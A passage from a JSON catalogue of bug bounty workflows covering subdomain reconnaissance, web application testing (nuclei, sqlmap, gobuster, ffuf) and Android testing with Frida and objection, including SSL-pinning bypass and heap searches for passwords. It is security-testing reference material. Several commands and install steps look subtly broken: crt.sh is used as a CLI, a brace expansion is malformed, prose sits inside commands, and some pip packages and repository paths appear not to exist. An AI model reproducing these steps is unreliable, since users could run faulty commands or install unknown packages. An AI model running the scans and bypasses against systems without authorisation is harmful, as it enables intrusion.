            "copyable": true
          },
          {
            "detail": "sudo apt install -y ffuf gobuster nuclei nmap masscan",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/projectdiscovery/subfinder ~/tools/subfinder",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/projectdiscovery/httpx ~/tools/httpx",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker/Containerized",
        "summary": "Ready-to-use reconnaissance container stack",
        "steps": [
          {
            "detail": "docker pull projectdiscovery/subfinder",
            "copyable": true
          },
          {
            "detail": "docker pull projectdiscovery/httpx",
            "copyable": true
          },
          {
            "detail": "docker pull projectdiscovery/nuclei",
            "copyable": true
          },
          {
            "detail": "docker pull caffix/amass",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/bugbounty/{scope,recon,evidence,reports}",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick scope validation",
        "command": "echo \"*.example.com\" | httpx -title -status-code -o scope_check.txt",
        "notes": [
          "Verify which domains are active and in scope"
        ]
      },
      {
        "description": "Subdomain discovery pipeline",
        "command": "subfinder -d example.com -silent | httpx -title -tech-detect -o active_subdomains.txt",
        "notes": [
          "Find and validate active subdomains"
        ]
      },
      {
        "description": "Asset correlation check",
        "command": "amass enum -d example.com -passive | grep -E \"(cloudfront|aws|azure|gcp)\" > cloud_assets.txt",
        "notes": [
          "Identify cloud-hosted assets for additional testing"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Scope Definition & Validation",
        "steps": [
          {
            "title": "Program Rules Analysis",
            "details": "Read and understand bug bounty program scope, rules, and exclusions",
            "command": "# Document scope: domains, IP ranges, mobile apps, APIs, out-of-scope items"
          },
          {
            "title": "Scope Asset Inventory",
            "details": "Create initial list of all in-scope assets from program description",
            "command": "echo -e \"*.example.com\\napi.example.com\\nmobile.example.com\" > scope_assets.txt"
          },
          {
            "title": "Wildcard Scope Expansion",
            "details": "Identify wildcard domains and potential subdomain scope",
            "command": "echo \"*.example.com\" | subfinder -silent | sort -u > potential_scope.txt"
          },
          {
            "title": "Scope Compliance Check",
            "details": "Verify all discovered assets against program rules",
            "command": "# Cross-reference findings with program policy and restrictions"
          }
        ]
      },
      {
        "title": "Phase 2: Passive Asset Discovery",
        "steps": [
          {
            "title": "Subdomain Enumeration",
            "details": "Discover subdomains using multiple passive sources",
            "command": "subfinder -d example.com -all -silent | sort -u > subdomains_passive.txt"
          },
          {
            "title": "Certificate Transparency Mining",
            "details": "Extract subdomains from certificate transparency logs",
            "command": "crt.sh -%.example.com | grep -E \"\\.example.com\" | sort -u > ct_subdomains.txt"
          },
          {
            "title": "DNS Record Discovery",
            "details": "Map DNS infrastructure and related assets",
            "command": "dnsrecon -d example.com -t axfr -o dns_records.txt"
          },
          {
            "title": "Cloud Asset Discovery",
            "details": "Identify cloud-hosted infrastructure and services",
            "command": "amass intel -org \"Example Company\" -active | grep -E \"(aws|azure|gcp)\" > cloud_assets.txt"
          }
        ]
      },
      {
        "title": "Phase 3: Active Asset Validation",
        "steps": [
          {
            "title": "HTTP/HTTPS Service Discovery",
            "details": "Identify active web services on discovered assets",
            "command": "cat subdomains_passive.txt | httpx -title -status-code -tech-detect -o active_web_assets.txt"
          },
          {
            "title": "Port Service Mapping",
            "details": "Map open ports and services on in-scope IP ranges",
            "command": "nmap -sS -sV -oA port_scan_$(date +%Y%m%d) target_range"
          },
          {
            "title": "Asset Technology Profiling",
            "details": "Identify technologies, frameworks, and potential vulnerabilities",
            "command": "whatweb -a3 -log-verbose=tech_profile.txt active_web_assets.txt"
          },
          {
            "title": "Asset Ownership Verification",
            "details": "Confirm asset ownership and scope compliance",
            "command": "# Whois lookups, DNS ownership, certificate validation"
          }
        ]
      },
      {
        "title": "Phase 4: Attack Surface Analysis",
        "steps": [
          {
            "title": "Web Application Mapping",
            "details": "Map web application structure and functionality",
            "command": "gobuster dir -u https://target.example.com -w common_dirs.txt -o web_structure.txt"
          },
          {
            "title": "API Endpoint Discovery",
            "details": "Identify API endpoints and documentation",
            "command": "curl -s https://target.example.com/ | grep -E \"(api|endpoint|rest|graphql)\" > api_endpoints.txt"
          },
          {
            "title": "Mobile App Analysis",
            "details": "Analyze mobile applications for in-app endpoints",
            "command": "# Extract APK/IPA, analyze network traffic, identify API calls"
          },
          {
            "title": "Third-Party Service Mapping",
            "details": "Identify third-party services and dependencies",
            "command": "# Check for CDNs, analytics, payment processors, auth providers"
          }
        ]
      },
      {
        "title": "Phase 5: Evidence Collection & Documentation",
        "steps": [
          {
            "title": "Asset Inventory Creation",
            "details": "Create comprehensive asset inventory with metadata",
            "command": "# Spreadsheet with domains, IPs, technologies, owners, scope status"
          },
          {
            "title": "Attack Surface Visualization",
            "details": "Create visual map of attack surface and relationships",
            "command": "# Use diagrams, mind maps, or attack surface tools"
          },
          {
            "title": "Scope Compliance Report",
            "details": "Document scope compliance and potential edge cases",
            "command": "# Report on in-scope assets, out-of-scope items, gray areas"
          },
          {
            "title": "Testing Prioritization",
            "details": "Prioritize assets based on criticality and vulnerability potential",
            "command": "# Rank assets by business impact, technology stack, exposure"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Comprehensive Bug Bounty Recon Pipeline",
        "stages": [
          {
            "label": "Setup & Configuration",
            "description": "Configure tools, create directory structure, define scope",
            "command": "mkdir -p ~/bugbounty/{scope,recon,evidence,reports} && echo \"*.example.com\" > scope/domains.txt"
          },
          {
            "label": "Passive Discovery",
            "description": "Gather intelligence without touching target infrastructure",
            "command": "subfinder -d example.com -all -silent | sort -u > recon/subdomains.txt && amass enum -d example.com -passive >> recon/subdomains.txt"
          },
          {
            "label": "Active Validation",
            "description": "Verify discovered assets and map attack surface",
            "command": "cat recon/subdomains.txt | httpx -title -status-code -tech-detect -o recon/active_assets.txt"
          },
          {
            "label": "Technology Profiling",
            "description": "Identify technologies and potential vulnerability vectors",
            "command": "whatweb -a3 -log-verbose=recon/tech_profile.txt recon/active_assets.txt && nuclei -l recon/active_assets.txt -o recon/initial_scan.txt"
          },
          {
            "label": "Scope Verification",
            "description": "Final scope validation and compliance check",
            "command": "# Review all findings against program policy, create final scope report"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Rate limiting detected",
        "meaning": "Target has defensive measures, adjust timing and use async scanning",
        "severity": "Medium"
      },
      {
        "indicator": "Wildcard certificate found",
        "meaning": "Large potential attack surface, prioritize subdomain enumeration",
        "severity": "High"
      },
      {
        "indicator": "Cloud infrastructure detected",
        "meaning": "Additional attack vectors via cloud misconfigurations",
        "severity": "Medium"
      },
      {
        "indicator": "Out-of-scope assets responding",
        "meaning": "Document but do not test, report to program if ambiguous",
        "severity": "Info"
      },
      {
        "indicator": "Third-party services in scope",
        "meaning": "Include in testing but respect third-party policies",
        "severity": "Low"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Subdomain Wordlist Generation",
        "scenario": "Generate targeted wordlists based on discovered patterns",
        "command": "cat recon/subdomains.txt | sed 's/.*\\.//' | sort -u > base_domains.txt && cat base_domains.txt | crunch 4 8 -f recon/patterns.txt > custom_wordlist.txt",
        "notes": [
          "Create patterns from existing subdomains for more effective brute forcing"
        ]
      },
      {
        "title": "Permutation-Based Discovery",
        "scenario": "Generate subdomain permutations for comprehensive coverage",
        "command": "gobuster dns -d example.com -w recon/active_assets.txt -t 50 -o recon/permutations.txt",
        "notes": [
          "Use discovered subdomains as seeds for permutation attacks"
        ]
      },
      {
        "title": "Asset Correlation Analysis",
        "scenario": "Correlate assets across multiple programs and organizations",
        "command": "# Cross-reference assets across programs, identify shared infrastructure",
        "notes": [
          "Use for multi-program reconnaissance and shared vulnerability impact"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Bug Bounty Reconnaissance Tools Comparison",
      "columns": ["Tool", "Speed", "Stealth", "Coverage", "Automation", "Best For"],
      "rows": [
        ["Subfinder", "Fast", "High", "Good", "Excellent", "Passive discovery"],
        ["Amass", "Medium", "Medium", "Excellent", "Good", "Comprehensive mapping"],
        ["Assetfinder", "Fast", "High", "Medium", "Good", "Quick discovery"],
        ["HTTPx", "Very Fast", "High", "Good", "Excellent", "Service validation"],
        ["Nuclei", "Fast", "Medium", "Good", "Excellent", "Vulnerability scanning"]
      ]
    },
    "resources": [
      {
        "label": "OWASP Testing Guide",
        "url": "https://owasp.org/www-project-web-security-testing-guide/",
        "description": "Comprehensive web application testing methodology"
      },
      {
        "label": "Bug Hunter's Methodology",
        "url": "https://github.com/projectdiscovery/bugbounty",
        "description": "ProjectDiscovery bug bounty methodology and tools"
      },
      {
        "label": "HackerOne Hacktivity",
        "url": "https://hackerone.com/hacktivity",
        "description": "Recent disclosures and bounty trends for scope analysis"
      },
      {
        "label": "Bugcrowd University",
        "url": "https://www.bugcrowd.com/hackers/bugcrowd-university/",
        "description": "Educational resources for bug bounty methodologies"
      }
    ]
  },
  {
    "id": "bugbounty_web_app_testing",
    "name": "Bug Bounty - Web Application Testing",
    "summary": "Systematic web application security testing workflow for bug bounty programs, covering reconnaissance, vulnerability assessment, exploitation, and responsible disclosure.",
    "details": "This workflow provides a comprehensive approach to web application testing in bug bounty programs. It combines automated scanning with manual testing techniques to identify vulnerabilities across the OWASP Top 10 and beyond, with emphasis on high-impact findings and proper evidence collection for bounty submissions.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install web application testing tools and dependencies",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git python3 python3-pip curl wget",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y burpsuite owasp-zap nikto gobuster ffuf sqlmap",
            "copyable": true
          },
          {
            "detail": "pip3 install requests beautifulsoup4 selenium paramiko",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/ffuf/ffuf/v2@latest",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install with Kali's comprehensive tool repositories",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y burpsuite owasp-zap nikto gobuster",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y sqlmap nmap ffuf wpscan joomscan nuclei",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/danielmiessler/SecLists ~/wordlists",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/sqlmapproject/sqlmap ~/tools/sqlmap",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker/Containerized",
        "summary": "Complete web testing environment in containers",
        "steps": [
          {
            "detail": "docker pull projectdiscovery/nuclei",
            "copyable": true
          },
          {
            "detail": "docker pull owasp/zap2docker-stable",
            "copyable": true
          },
          {
            "detail": "docker pull securing/docker-sqlmap",
            "copyable": true
          },
          {
            "detail": "docker run --rm -p 8080:8080 owasp/zap2docker-stable zap.sh -daemon -host 0.0.0.0 -port 8080",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/bugbounty/{targets,scans,evidence,reports}",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick vulnerability scan",
        "command": "nuclei -l targets.txt -severity critical,high -o critical_findings.txt",
        "notes": [
          "Focus on high-severity vulnerabilities first"
        ]
      },
      {
        "description": "Directory fuzzing with common patterns",
        "command": "ffuf -w ~/wordlists/common.txt -u https://target.example.com/FUZZ -mc 200,301,302",
        "notes": [
          "Find hidden directories and files"
        ]
      },
      {
        "description": "SQL injection quick test",
        "command": "sqlmap -u \"https://target.example.com/page?id=1\" --batch --level=1 --risk=1",
        "notes": [
          "Basic SQL injection testing with safe parameters"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Target Profiling & Reconnaissance",
        "steps": [
          {
            "title": "Application Technology Stack",
            "details": "Identify web server, frameworks, languages, and databases",
            "command": "whatweb --log-verbose=tech_stack.txt https://target.example.com && wappalyzer https://target.example.com"
          },
          {
            "title": "Application Functionality Mapping",
            "details": "Map application features, user flows, and attack surface",
            "command": "# Manual browsing, spidering, and functionality documentation"
          },
          {
            "title": "API Endpoint Discovery",
            "details": "Identify REST, GraphQL, and other API endpoints",
            "command": "curl -s https://target.example.com/ | grep -E \"(api|rest|graphql|endpoint)\" > api_endpoints.txt"
          },
          {
            "title": "Security Headers Analysis",
            "details": "Check for missing or misconfigured security headers",
            "command": "curl -I https://target.example.com | grep -E \"(X-Frame|X-XSS|X-Content|CSP|HSTS)\""
          }
        ]
      },
      {
        "title": "Phase 2: Automated Vulnerability Scanning",
        "steps": [
          {
            "title": "Nuclei Template Scanning",
            "details": "Run comprehensive template-based vulnerability scanning",
            "command": "nuclei -l targets.txt -t ~/nuclei-templates/ -o nuclei_scan.txt -severity critical,high,medium"
          },
          {
            "title": "Nikto Web Vulnerability Scan",
            "details": "Identify known vulnerabilities and misconfigurations",
            "command": "nikto -h https://target.example.com -o nikko_results.txt -Format txt"
          },
          {
            "title": "Directory & File Discovery",
            "details": "Find hidden directories, files, and backup files",
            "command": "gobuster dir -u https://target.example.com -w ~/wordlists/directory-list-2.3-medium.txt -o dirs_found.txt"
          },
          {
            "title": "Parameter Discovery",
            "details": "Discover hidden parameters and attack points",
            "command": "ffuf -w ~/wordlists/params.txt -u \"https://target.example.com/page?FUZZ=value\" -mc 200"
          }
        ]
      },
      {
        "title": "Phase 3: Manual Security Testing",
        "steps": [
          {
            "title": "Authentication & Authorization",
            "details": "Test authentication bypass, privilege escalation, and access control",
            "command": "# Test login bypass, session management, role-based access, JWT manipulation"
          },
          {
            "title": "Injection Vulnerabilities",
            "details": "Test for SQL, NoSQL, command, and template injection",
            "command": "sqlmap -u \"https://target.example.com/search?q=test\" --batch --level=2 --risk=2"
          },
          {
            "title": "Cross-Site Scripting (XSS)",
            "details": "Test for reflected, stored, and DOM-based XSS",
            "command": "# Use Burp Suite scanner and manual payload testing"
          },
          {
            "title": "File Upload & Path Traversal",
            "details": "Test file upload restrictions and path traversal vulnerabilities",
            "command": "# Test various file types, double extensions, directory traversal patterns"
          }
        ]
      },
      {
        "title": "Phase 4: Advanced Vulnerability Assessment",
        "steps": [
          {
            "title": "Business Logic Flaws",
            "details": "Identify business logic vulnerabilities and race conditions",
            "command": "# Test multi-step workflows, price manipulation, authorization bypasses"
          },
          {
            "title": "Client-Side Security",
            "details": "Test for client-side vulnerabilities and data exposure",
            "command": "# Analyze JavaScript, DOM manipulation, local storage, CSRF tokens"
          },
          {
            "title": "Server-Side Request Forgery (SSRF)",
            "details": "Test for SSRF vulnerabilities in file imports, webhooks, redirects",
            "command": "# Test with internal IP addresses, DNS rebinding, cloud metadata endpoints"
          },
          {
            "title": "Insecure Direct Object References (IDOR)",
            "details": "Test for IDOR vulnerabilities in API endpoints and URLs",
            "command": "# Manipulate IDs, UUIDs, and object references in requests"
          }
        ]
      },
      {
        "title": "Phase 5: Exploitation & Evidence Collection",
        "steps": [
          {
            "title": "Vulnerability Validation",
            "details": "Validate and document each finding with proof of concept",
            "command": "# Create PoC exploits, screenshots, and detailed evidence"
          },
          {
            "title": "Impact Assessment",
            "details": "Assess business impact and potential exploit chains",
            "command": "# Document data exposure, privilege escalation, system compromise potential"
          },
          {
            "title": "Evidence Organization",
            "details": "Organize evidence for bounty submission with clear documentation",
            "command": "mkdir -p evidence/{vuln_type}/screenshots,pocs,logs"
          },
          {
            "title": "Responsible Disclosure",
            "details": "Prepare responsible disclosure report with remediation guidance",
            "command": "# Write detailed vulnerability report with steps to reproduce and fix"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Bug Bounty Web Application Testing Timeline",
        "stages": [
          {
            "label": "Day 1: Reconnaissance & Profiling",
            "description": "Complete application profiling, technology identification, and attack surface mapping",
            "command": "whatweb -a3 https://target.example.com && gobuster dir -u https://target.example.com -w common.txt -o day1_recon.txt"
          },
          {
            "label": "Day 2: Automated Scanning",
            "description": "Run comprehensive automated scans to identify obvious vulnerabilities",
            "command": "nuclei -l targets.txt -severity critical,high -o day2_critical.txt && nikto -h https://target.example.com -o day2_nikko.txt"
          },
          {
            "label": "Day 3: Manual Testing - Authentication",
            "description": "Focus on authentication bypass, session management, and authorization flaws",
            "command": "# Configure Burp Suite, test authentication mechanisms, analyze tokens"
          },
          {
            "label": "Day 4: Manual Testing - Injection",
            "description": "Test for injection vulnerabilities including SQL, XSS, and command injection",
            "command": "sqlmap -u \"https://target.example.com/vulnerable\" --batch && manual XSS testing"
          },
          {
            "label": "Day 5: Advanced Testing & Reporting",
            "description": "Test business logic, prepare findings, and generate bounty submission",
            "command": "# Test edge cases, validate findings, prepare evidence, write report"
          }
        ]
      },
      {
        "name": "Rapid Triage Workflow",
        "stages": [
          {
            "label": "Critical Vulnerability Hunt",
            "description": "Focus on high-impact vulnerabilities first",
            "command": "nuclei -l targets.txt -severity critical -t cves/ -o triage_critical.txt"
          },
          {
            "label": "Authentication Bypass Testing",
            "description": "Quick test for common authentication flaws",
            "command": "# Test default credentials, SQL injection in login, JWT manipulation"
          },
          {
            "label": "Injection Vector Discovery",
            "description": "Identify and test injection points",
            "command": "ffuf -w params.txt -u \"https://target.example.com/search?FUZZ=test\" -mc 200"
          },
          {
            "label": "Business Logic Testing",
            "description": "Test for logic flaws in core functionality",
            "command": "# Test price manipulation, race conditions, workflow bypasses"
          },
          {
            "label": "Evidence Collection",
            "description": "Document and validate findings for submission",
            "command": "# Create PoC, screenshots, and detailed vulnerability report"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "SQL injection error message",
        "meaning": "Critical vulnerability with potential data breach impact",
        "severity": "Critical"
      },
      {
        "indicator": "Reflected XSS payload executed",
        "meaning": "Client-side vulnerability with phishing potential",
        "severity": "High"
      },
      {
        "indicator": "Authentication bypass successful",
        "meaning": "Complete account compromise possible",
        "severity": "Critical"
      },
      {
        "indicator": "File upload of web shell",
        "meaning": "Remote code execution on server",
        "severity": "Critical"
      },
      {
        "indicator": "SSRF to internal services",
        "meaning": "Internal network access and data exfiltration",
        "severity": "High"
      },
      {
        "indicator": "Rate limiting bypass found",
        "meaning": "Brute force attacks possible",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Nuclei Template Development",
        "scenario": "Create custom templates for application-specific vulnerabilities",
        "command": "# Create YAML templates for business logic flaws and custom endpoints",
        "notes": [
          "Develop targeted templates for unique application functionality"
        ]
      },
      {
        "title": "Burp Suite Intruder Automation",
        "scenario": "Automate parameter fuzzing and attack payloads",
        "command": "# Use Intruder with custom payloads for comprehensive testing",
        "notes": [
          "Create custom payload lists based on application context"
        ]
      },
      {
        "title": "Race Condition Testing",
        "scenario": "Test for race conditions in critical workflows",
        "command": "# Use threading tools to send concurrent requests",
        "notes": [
          "Focus on payment processing, password reset, and registration flows"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Web Application Testing Tools Comparison",
      "columns": ["Tool", "Automation", "Manual Testing", "Coverage", "Learning Curve", "Best For"],
      "rows": [
        ["Burp Suite", "Good", "Excellent", "Excellent", "Medium", "Comprehensive testing"],
        ["OWASP ZAP", "Good", "Good", "Good", "Easy", "Free alternative"],
        ["Nuclei", "Excellent", "Limited", "Good", "Easy", "Template scanning"],
        ["SQLMap", "Excellent", "Good", "Limited", "Easy", "SQL injection"],
        ["FFuf", "Excellent", "Good", "Limited", "Easy", "Fuzzing"]
      ]
    },
    "resources": [
      {
        "label": "OWASP Top 10",
        "url": "https://owasp.org/www-project-top-ten/",
        "description": "Most critical web application security risks"
      },
      {
        "label": "PortSwigger Web Security Academy",
        "url": "https://portswigger.net/web-security",
        "description": "Free web security training and labs"
      },
      {
        "label": "HackerOne Hacktivity",
        "url": "https://hackerone.com/hacktivity",
        "description": "Recent disclosures and bounty trends"
      },
      {
        "label": "Bug Bounty Cheat Sheet",
        "url": "https://github.com/djadmin/awesome-bug-bounty",
        "description": "Comprehensive bug bounty resources and methodologies"
      }
    ]
  },
  {
    "id": "bugbounty_mobile_app_testing",
    "name": "Bug Bounty - Mobile Application Testing",
    "summary": "Comprehensive mobile application security testing workflow for bug bounty programs, covering iOS, Android, and hybrid applications with static analysis, dynamic testing, and API security.",
    "details": "This workflow provides a systematic approach to mobile application security testing in bug bounty programs. It covers static analysis of application binaries, dynamic testing of running applications, network traffic analysis, and backend API testing, with emphasis on mobile-specific vulnerabilities and proper evidence collection.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install mobile testing tools and Android SDK",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git python3 python3-pip default-jdk",
            "copyable": true
          },
          {
            "detail": "wget https://dl.google.com/android/android-sdk_r24.4.1-linux.tgz",
            "copyable": true
          },
          {
            "detail": "tar -xzf android-sdk_r24.4.1-linux.tgz && export ANDROID_HOME=$PWD/android-sdk-linux",
            "copyable": true
          },
          {
            "detail": "pip3 install frida-tools objection mobsec dllib",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/sensepost/objection ~/tools/objection",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install with Kali's mobile security tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y android-tools-adb android-tools-fastboot",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y gdb radare2 apktool jadx drozer",
            "copyable": true
          },
          {
            "detail": "pip3 install frida-tools objection mobsec",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/NVISO-BE/MobSF ~/tools/MobSF",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker/Containerized",
        "summary": "Mobile Security Framework (MobSF) and analysis tools",
        "steps": [
          {
            "detail": "docker pull opensecurity/mobile-security-framework-mobsf",
            "copyable": true
          },
          {
            "detail": "docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest",
            "copyable": true
          },
          {
            "detail": "docker pull frida/frida",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/mobile/{apps,analysis,evidence,reports}",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/dweiss/flare ~/tools/flare",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick APK static analysis",
        "command": "jadx -d decompiled app.apk && grep -r \"password\" decompiled/",
        "notes": [
          "Extract hardcoded secrets and sensitive data"
        ]
      },
      {
        "description": "Network traffic analysis",
        "command": "frida-trace -U -f com.example.app -i \"*SSL*\" -i \"*HTTP*\"",
        "notes": [
          "Monitor network traffic and SSL configurations"
        ]
      },
      {
        "description": "Basic Frida hooking",
        "command": "objection -g com.example.app explore android sslpinning disable",
        "notes": [
          "Bypass SSL pinning for traffic interception"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Application Setup & Environment",
        "steps": [
          {
            "title": "Application Acquisition",
            "details": "Obtain mobile application from app stores or direct download",
            "command": "# Download APK/IPA, note version, release date, and changelog"
          },
          {
            "title": "Emulator/Device Setup",
            "details": "Configure Android emulator or physical device for testing",
            "command": "emulator -avd test_device -no-snapshot-load || adb devices"
          },
          {
            "title": "Tool Installation",
            "details": "Install and configure mobile testing tools and frameworks",
            "command": "pip3 install frida-tools objection && adb shell settings put global airplane_mode_on 0"
          },
          {
            "title": "Proxy Configuration",
            "details": "Configure network proxy for traffic interception",
            "command": "# Set up Burp Suite/ZAP mobile proxy and install CA certificate"
          }
        ]
      },
      {
        "title": "Phase 2: Static Analysis",
        "steps": [
          {
            "title": "Binary Analysis",
            "details": "Analyze application binary for embedded secrets and configurations",
            "command": "jadx -d static_analysis app.apk && grep -r -i \"password\\|api_key\\|secret\" static_analysis/"
          },
          {
            "title": "Manifest Analysis",
            "details": "Analyze AndroidManifest.xml for security misconfigurations",
            "command": "aapt dump badging app.apk > manifest_analysis.txt && apktool d app.apk"
          },
          {
            "title": "Code Review",
            "details": "Review decompiled code for security vulnerabilities",
            "command": "# Look for hardcoded credentials, weak cryptography, insecure storage"
          },
          {
            "title": "MobSF Automated Analysis",
            "details": "Run comprehensive automated static analysis",
            "command": "# Upload APK to MobSF for detailed security assessment"
          }
        ]
      },
      {
        "title": "Phase 3: Dynamic Analysis - Local",
        "steps": [
          {
            "title": "Runtime Hooking",
            "details": "Use Frida to hook and monitor application behavior",
            "command": "objection -g com.example.app explore android heap search instances string"
          },
          {
            "title": "Filesystem Analysis",
            "details": "Examine application storage and data handling",
            "command": "objection -g com.example.app explore android ls /data/data/com.example.app"
          },
          {
            "title": "Keychain/Keystore Analysis",
            "details": "Analyze secure storage mechanisms and key management",
            "command": "# Test keychain access, encrypted data storage, certificate pinning"
          },
          {
            "title": "Biometric Authentication Testing",
            "details": "Test biometric authentication bypasses and fallback mechanisms",
            "command": "# Test face ID/fingerprint bypass and alternative authentication methods"
          }
        ]
      },
      {
        "title": "Phase 4: Dynamic Analysis - Network",
        "steps": [
          {
            "title": "SSL/TLS Configuration",
            "details": "Test SSL/TLS implementation and certificate validation",
            "command": "objection -g com.example.app explore android sslpinning disable"
          },
          {
            "title": "API Endpoint Discovery",
            "details": "Identify and analyze backend API endpoints",
            "command": "frida-trace -U -f com.example.app -i \"*HTTP*\" -o api_calls.txt"
          },
          {
            "title": "Network Traffic Analysis",
            "details": "Intercept and analyze network traffic for vulnerabilities",
            "command": "# Use Burp Suite/ZAP to analyze API calls, headers, and data"
          },
          {
            "title": "Authentication Token Analysis",
            "details": "Analyze authentication tokens and session management",
            "command": "# Examine JWT tokens, session cookies, and API key handling"
          }
        ]
      },
      {
        "title": "Phase 5: Backend API Testing",
        "steps": [
          {
            "title": "API Security Testing",
            "details": "Test backend APIs for common vulnerabilities",
            "command": "# Test injection, broken authentication, excessive data exposure"
          },
          {
            "title": "Rate Limiting Testing",
            "details": "Test API rate limiting and abuse prevention",
            "command": "# Test with automated tools for rate limit bypass"
          },
          {
            "title": "Business Logic Testing",
            "details": "Test mobile-specific business logic vulnerabilities",
            "command": "# Test in-app purchases, user actions, workflow bypasses"
          },
          {
            "title": "Cross-Platform Consistency",
            "details": "Verify security controls across iOS and Android platforms",
            "command": "# Compare API implementations and security controls"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Mobile Application Testing Timeline",
        "stages": [
          {
            "label": "Day 1: Setup & Static Analysis",
            "description": "Environment setup, application acquisition, and static code analysis",
            "command": "jadx -d day1_decompiled app.apk && mobsf-static-analysis app.apk"
          },
          {
            "label": "Day 2: Dynamic Local Testing",
            "description": "Runtime analysis, filesystem examination, and local storage testing",
            "command": "objection -g com.example.app explore android heap search instances password"
          },
          {
            "label": "Day 3: Network Analysis",
            "description": "SSL bypass, traffic interception, and API endpoint discovery",
            "command": "objection -g com.example.app explore android sslpinning disable && frida-trace -U -f com.example.app -i \"*HTTP*\""
          },
          {
            "label": "Day 4: Backend API Testing",
            "description": "Comprehensive API security testing and business logic analysis",
            "command": "# Test discovered API endpoints for injection, auth bypass, and data exposure"
          },
          {
            "label": "Day 5: Cross-Platform & Reporting",
            "description": "Cross-platform testing and vulnerability report preparation",
            "command": "# Test iOS equivalent, document findings, prepare bounty submission"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Hardcoded API keys in binary",
        "meaning": "Backend API access possible, potential data breach",
        "severity": "Critical"
      },
      {
        "indicator": "SSL pinning bypass successful",
        "meaning": "Network traffic can be intercepted and modified",
        "severity": "High"
      },
      {
        "indicator": "Insecure data storage",
        "meaning": "Sensitive data accessible to other apps or root users",
        "severity": "High"
      },
      {
        "indicator": "Weak authentication implementation",
        "meaning": "Account takeover and unauthorized access possible",
        "severity": "Critical"
      },
      {
        "indicator": "Biometric bypass successful",
        "meaning": "Authentication mechanisms can be circumvented",
        "severity": "High"
      },
      {
        "indicator": "Debug symbols present",
        "meaning": "Code analysis easier, may expose internal logic",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Frida Scripts",
        "scenario": "Develop custom Frida scripts for application-specific testing",
        "command": "# Create JavaScript hooks for custom encryption and protocols",
        "notes": [
          "Target proprietary protocols and custom security implementations"
        ]
      },
      {
        "title": "LLVM Pass Analysis",
        "scenario": "Use LLVM passes for advanced static analysis",
        "command": "# Compile with LLVM instrumentation for data flow analysis",
        "notes": [
          "Advanced static analysis for complex applications"
        ]
      },
      {
        "title": "Emulator Detection Bypass",
        "scenario": "Bypass emulator detection for dynamic analysis",
        "command": "# Modify system properties and hook detection methods",
        "notes": [
          "Enable testing on emulated environments"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Mobile Testing Tools Comparison",
      "columns": ["Tool", "Static Analysis", "Dynamic Analysis", "Platform", "Learning Curve", "Best For"],
      "rows": [
        ["MobSF", "Excellent", "Good", "Both", "Easy", "Comprehensive analysis"],
        ["Frida", "Limited", "Excellent", "Both", "Hard", "Runtime hooking"],
        ["Objection", "Limited", "Excellent", "Both", "Medium", "Runtime exploration"],
        ["Jadx", "Excellent", "None", "Android", "Easy", "Decompilation"],
        ["Drozer", "Limited", "Good", "Android", "Medium", "Attack surface"]
      ]
    },
    "resources": [
      {
        "label": "OWASP Mobile Security Testing Guide",
        "url": "https://github.com/OWASP/owasp-mstg",
        "description": "Comprehensive mobile application security testing methodology"
      },
      {
        "label": "MobSF Documentation",
        "url": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
        "description": "Mobile Security Framework documentation and usage"
      },
      {
        "label": "Frida Documentation",
        "url": "https://frida.re/docs/home/",
        "description": "Dynamic instrumentation toolkit documentation"
      },
      {
        "label": "Mobile App Hacker's Toolkit",
        "url": "https://github.com/d-a-n/mobile-app-pentest-tools",
        "description": "Collection of mobile security testing tools"
      }
    ]
  },
  {
    "id": "bugbounty_api_testing",
    "name": "Bug Bounty - API Testing",
